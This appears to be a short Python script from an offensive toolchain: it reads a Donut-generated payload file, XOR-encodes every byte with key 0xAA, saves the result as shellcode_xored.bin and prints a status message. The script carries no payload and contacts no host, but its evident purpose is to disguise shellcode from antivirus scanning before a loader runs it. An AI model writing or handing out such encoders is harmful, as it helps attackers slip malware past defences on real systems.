with open("donut_payload.bin", "rb") as f:
    data = bytearray(f.read())

key = 0xAA
encoded = bytearray([b ^ key for b in data])

with open("shellcode_xored.bin", "wb") as f:
    f.write(encoded)

print(f"[+] Shellcode coded with XOR (key = 0x{key:02X}) saved as shellcode_xored.bin")
